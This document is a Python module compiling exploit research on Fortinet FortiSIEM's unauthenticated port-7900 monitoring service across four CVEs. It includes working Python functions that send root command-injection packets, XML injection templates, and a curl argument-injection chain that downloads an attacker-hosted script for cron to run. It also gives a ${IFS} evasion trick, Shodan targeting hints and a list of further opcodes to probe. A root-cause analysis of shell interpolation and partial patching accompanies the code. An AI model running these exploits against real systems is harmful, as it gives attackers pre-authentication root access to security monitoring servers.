"""
Fortinet FortiSIEM RE -- Phoenix Monitor Protocol (port 7900)
Sources:
  - horizon3ai-pocs/CVE-2023-34992/CVE-2023-34992.py
  - horizon3ai-pocs/CVE-2024-23108/CVE-2024-23108.py
  - horizon3ai-pocs/CVE-2025-64155/CVE-2025-64155.py
  - watchtowr-research/watchTowr-vs-FortiSIEM-CVE-2025-25256/watchTowr-vs-FortiSIEM-CVE-2025-25256.py
Products: Fortinet FortiSIEM (all confirmed vulnerable versions)
"""

# ---------------------------------------------------------
# Protocol anatomy -- Phoenix Monitor (port 7900)
# ---------------------------------------------------------
PHOENIX_MONITOR_PROTOCOL = {
    "service":     "Phoenix Monitor (FortiSIEM internal monitoring daemon)",
    "port":        7900,
    "transport":   "TCP/TLS (self-signed cert, verify=CERT_NONE)",
    "auth":        "NONE -- no authentication required on port 7900",
    "format":      "Binary header + XML payload",

    "header_format": {
        "total_size":   16,
        "layout":       "[opcode(4 LE)] + [payload_len(4 LE)] + [magic(4 LE)] + [zero(4 LE)]",
        "magic":        1075724911,  # 0x40230 ... constant across all exploits
        "opcode_known": {
            81:   "handleStorageRequest (NFS/generic storage test)",
            90:   "handleArchiveStorageRequest (archive NFS path test)",
            156:  "handleElasticStorageRequest (Elasticsearch storage test)",
        },
    },

    "packet_builder": """
import struct

def build_phoenix_packet(opcode: int, payload: str) -> bytes:
    payload_bytes = payload.encode()
    header = (
        struct.pack('<I', opcode) +
        struct.pack('<I', len(payload_bytes)) +
        struct.pack('<I', 1075724911) +
        struct.pack('<I', 0)
    )
    return header + payload_bytes
""",

    "security_note": (
        "Port 7900 listens on 0.0.0.0 by default (not localhost-only). "
        "The Phoenix Monitor service runs as root (process owner = root on tested versions). "
        "XML payloads are parsed and fields are passed directly to shell commands via shell injection "
        "or argument injection with no sanitization. "
        "Every CVE in this module exploits the same unauthenticated port with a different opcode "
        "or XML field -- the surface was never audited holistically."
    ),
}


# ---------------------------------------------------------
# FFSM-F01: CVE-2023-34992 -- NFS server_ip command injection (opcode 81)
# ---------------------------------------------------------
FFSM_F01_CVE_2023_34992 = {
    "id":       "FFSM-F01",
    "product":  "Fortinet FortiSIEM",
    "cve":      "CVE-2023-34992",
    "severity": "CRITICAL -- pre-auth unauthenticated RCE via port 7900 NFS server_ip injection",
    "class":    "Command injection in NFS storage test handler (CWE-77)",
    "source":   "Horizon3.ai research",

    "description": (
        "The Phoenix Monitor handleStorageRequest (opcode 81) processes XML TEST_STORAGE payloads. "
        "For type='nfs', the server_ip field is passed directly to an NFS mount test command "
        "without sanitization. "
        "Injecting semicolons into server_ip terminates the NFS command and appends an arbitrary "
        "shell command that executes as root."
    ),

    "payload_template": """<TEST_STORAGE type="nfs">
    <server_ip>127.0.0.1; {cmd};</server_ip>
    <mount_point>/test</mount_point>
</TEST_STORAGE>""",

    "injection_field":  "server_ip",
    "injection_syntax": "127.0.0.1; <command>;",
    "opcode":           81,
    "execution_context": "root (Phoenix Monitor runs as root)",

    "exploit": """
import socket, struct, ssl

def fortisiem_rce_2023_34992(target: str, cmd: str, port: int = 7900):
    payload = f\"\"\"<TEST_STORAGE type="nfs">
    <server_ip>127.0.0.1; {cmd};</server_ip>
    <mount_point>/test</mount_point>
</TEST_STORAGE>\"\"\"
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    with socket.socket() as s:
        with ctx.wrap_socket(s, server_hostname=target) as ss:
            ss.connect((target, port))
            msg = struct.pack('<I', 81) + struct.pack('<I', len(payload)) + struct.pack('<I', 1075724911) + struct.pack('<I', 0)
            ss.sendall(msg + payload.encode())
            return ss.recv(1024)
""",
}


# ---------------------------------------------------------
# FFSM-F02: CVE-2024-23108 -- NFS mount_point command injection (opcode 81, patch bypass)
# ---------------------------------------------------------
FFSM_F02_CVE_2024_23108 = {
    "id":       "FFSM-F02",
    "product":  "Fortinet FortiSIEM",
    "cve":      "CVE-2024-23108",
    "severity": "CRITICAL -- patch bypass; injection moved to mount_point field (same opcode 81)",
    "class":    "Incomplete fix / command injection in mount_point field (CWE-77)",
    "source":   "Horizon3.ai research (follow-up to CVE-2023-34992)",

    "description": (
        "Fortinet patched CVE-2023-34992 by sanitizing the server_ip field in the NFS handler. "
        "CVE-2024-23108 demonstrates that the mount_point field received NO sanitization. "
        "The same opcode 81 (handleStorageRequest type=nfs) with injection in mount_point "
        "achieves the same pre-auth RCE as root on unpatched-for-23108 systems. "
        "Both CVEs use the same binary protocol on port 7900."
    ),

    "payload_template": """<TEST_STORAGE type="nfs">
    <server_ip>127.0.0.1</server_ip>
    <mount_point>/lala; {cmd};</mount_point>
</TEST_STORAGE>""",

    "injection_field":  "mount_point",
    "injection_syntax": "/lala; <command>;",
    "opcode":           81,

    "patch_bypass_note": (
        "The patch for CVE-2023-34992 sanitized server_ip but left mount_point unsanitized. "
        "This is a recurring pattern: Fortinet patches individual fields rather than using "
        "a parameterized approach (e.g., subprocess.run([...], shell=False)). "
        "The root cause -- shell=True with XML field interpolation -- persists across both CVEs."
    ),
}


# ---------------------------------------------------------
# FFSM-F03: CVE-2025-64155 -- Elasticsearch cluster_url argument injection (opcode 156)
# ---------------------------------------------------------
FFSM_F03_CVE_2025_64155 = {
    "id":       "FFSM-F03",
    "product":  "Fortinet FortiSIEM",
    "cve":      "CVE-2025-64155",
    "severity": "CRITICAL -- pre-auth argument injection via Elasticsearch storage test; writes attacker file via curl",
    "class":    "Argument injection in curl call, cron-based execution (CWE-88)",
    "source":   "Horizon3.ai research",

    "description": (
        "The Phoenix Monitor handleElasticStorageRequest (opcode 156) processes Elasticsearch "
        "storage test XML. "
        "The cluster_url field is passed to a curl invocation via elastic_test_url.sh "
        "(/opt/phoenix/phscripts/bin/elastic_test_url.sh 'test_name' 'cluster_url'). "
        "An attacker injects curl arguments via cluster_url to write an attacker-controlled script "
        "to a writable path (/opt/charting/redishb.sh), then triggers its execution via cron. "
        "The injected value uses '--next -o <output_path> <attacker_url>' to write the file."
    ),

    "payload_example": """<TEST_STORAGE type="elastic">
    <client_type>javaTransportClient</client_type>
    <cluster_name>test_name</cluster_name>
    <cluster_ip>10.0.40.83</cluster_ip>
    <cluster_url>http://10.0.40.83:9200 --next -o /opt/charting/redishb.sh http://10.0.40.83:9200</cluster_url>
    <java_port>5555</java_port>
    <http_port>4444</http_port>
    <number_of_shards>3</number_of_shards>
    <number_of_replicas>4</number_of_replicas>
    <elasticsearch_service_type>test_type</elasticsearch_service_type>
    <username>testuser</username>
    <password>testpass</password>
</TEST_STORAGE>""",

    "injection_field":    "cluster_url",
    "injection_syntax":   "<normal_url> --next -o <writable_path> <attacker_url>",
    "opcode":             156,

    "execution_mechanism": (
        "curl is invoked with cluster_url as a positional argument. "
        "'--next' (aka -:) resets curl options for the next URL. "
        "'-o /opt/charting/redishb.sh' writes the attacker's URL response to the target file. "
        "/opt/charting/redishb.sh is executed by a cron job. "
        "Payload delivery: host an HTTP server with the shell payload, curl writes it, cron runs it."
    ),

    "writable_path":  "/opt/charting/redishb.sh (cron-executed by FortiSIEM cron config)",
    "execution_time": "Up to 1 cron interval (typically 1-5 minutes for FortiSIEM internal crons)",
}


# ---------------------------------------------------------
# FFSM-F04: CVE-2025-25256 -- Archive storage backtick injection (opcode 90)
# ---------------------------------------------------------
FFSM_F04_CVE_2025_25256 = {
    "id":       "FFSM-F04",
    "product":  "Fortinet FortiSIEM",
    "cve":      "CVE-2025-25256",
    "severity": "CRITICAL -- pre-auth RCE via backtick injection in archive NFS path (opcode 90)",
    "class":    "Command injection via backtick shell substitution (CWE-77)",
    "source":   "watchTowr research (Sina Kheirkhah @SinSinology)",

    "description": (
        "The Phoenix Monitor handleArchiveStorageRequest (opcode 90) processes archive storage "
        "test XML. "
        "The archive_nfs_archive_dir field is passed to a shell command without sanitization. "
        "Backtick injection (`cmd`) causes the shell to execute the command and substitute its output. "
        "Spaces in commands are replaced with ${IFS} to avoid argument splitting. "
        "This is a THIRD distinct injection point in the same Phoenix Monitor service, "
        "exploiting opcode 90 after the opcode 81 injections were patched."
    ),

    "payload_template": """<root>
    <archive_storage_type>nfs</archive_storage_type>
    <archive_nfs_server_ip>127.0.0.1</archive_nfs_server_ip>
    <archive_nfs_archive_dir>`{cmd}`</archive_nfs_archive_dir>
    <scope>local</scope>
</root>""",

    "injection_field":  "archive_nfs_archive_dir",
    "injection_syntax": "`<command>`",
    "space_evasion":    "Replace spaces with ${IFS}: 'id' works as-is; 'curl http://x.x.x.x/y' -> 'curl${IFS}http://x.x.x.x/y'",
    "opcode":           90,

    "exploit": """
import socket, struct, ssl

def fortisiem_rce_25256(target: str, cmd: str, port: int = 7900):
    cmd_escaped = cmd.replace(' ', '${IFS}')
    payload = f\"\"\"<root>
    <archive_storage_type>nfs</archive_storage_type>
    <archive_nfs_server_ip>127.0.0.1</archive_nfs_server_ip>
    <archive_nfs_archive_dir>`{cmd_escaped}`</archive_nfs_archive_dir>
    <scope>local</scope>
</root>\"\"\"
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    with socket.socket() as s:
        with ctx.wrap_socket(s, server_hostname=target) as ss:
            ss.connect((target, port))
            header = (struct.pack('<I', 90) + struct.pack('<I', len(payload)) +
                      struct.pack('<I', 1075724911) + struct.pack('<I', 0))
            ss.sendall(header + payload.encode())
            try:
                return ss.recv(1024)
            except Exception:
                return b''
""",
}


# ---------------------------------------------------------
# FFSM-F05: Cross-CVE analysis -- FortiSIEM port 7900 systematic failure
# ---------------------------------------------------------
FFSM_F05_SYSTEMIC_ANALYSIS = {
    "id":       "FFSM-F05",
    "product":  "Fortinet FortiSIEM (Phoenix Monitor service)",
    "severity": "CRITICAL -- systemic design failure; 4 CVEs in same unauth service on same port",
    "class":    "Systemic: no auth + shell=True + XML field interpolation (CWE-77 / CWE-306)",

    "pattern": (
        "All four CVEs exploit the same root cause: "
        "(1) Phoenix Monitor listens on port 7900 with NO authentication, "
        "(2) XML payloads are parsed and fields are interpolated directly into shell commands "
        "    (either via shell=True subprocess or string concatenation into os.system()/subprocess.Popen()), "
        "(3) No XML field sanitization. "
        "Fortinet patched CVE-2023-34992 by sanitizing one field (server_ip), "
        "then CVE-2024-23108 used mount_point (same opcode). "
        "CVE-2025-64155 uses a completely different opcode (156) and handler. "
        "CVE-2025-25256 uses yet another opcode (90) and backtick injection. "
        "This demonstrates a surface that was never audited holistically -- each bug was patched "
        "individually while the architectural flaw (unauth service + shell interpolation) remained."
    ),

    "cve_timeline": [
        {"cve": "CVE-2023-34992", "opcode": 81, "field": "server_ip",            "injection": "semicolon"},
        {"cve": "CVE-2024-23108", "opcode": 81, "field": "mount_point",          "injection": "semicolon (patch bypass)"},
        {"cve": "CVE-2025-64155", "opcode": 156, "field": "cluster_url",         "injection": "curl --next arg injection -> cron"},
        {"cve": "CVE-2025-25256", "opcode": 90,  "field": "archive_nfs_archive_dir", "injection": "backtick substitution"},
    ],

    "additional_opcodes_to_probe": (
        "The three known opcodes (81, 90, 156) handle NFS, archive NFS, and Elasticsearch. "
        "FortiSIEM supports: S3, Azure Blob, SFTP, SCP, CIFS/SMB, HDFS storage backends. "
        "Each storage type handler likely has its own XML fields and shell invocation. "
        "Pending: enumerate all opcodes and XML field -> shell argument mappings via ablation "
        "semantic sweep on the Phoenix Monitor binary."
    ),

    "access_from_internet": (
        "FortiSIEM deployments expose port 7900 externally in some configurations. "
        "Shodan dorks for port 7900 with the Phoenix Monitor TLS cert CN "
        "will identify internet-exposed targets."
    ),

    "fortisiem_cert_fingerprint": "CN=FortiSIEM or CN matching hostname; self-signed; TLS 1.2+",
}
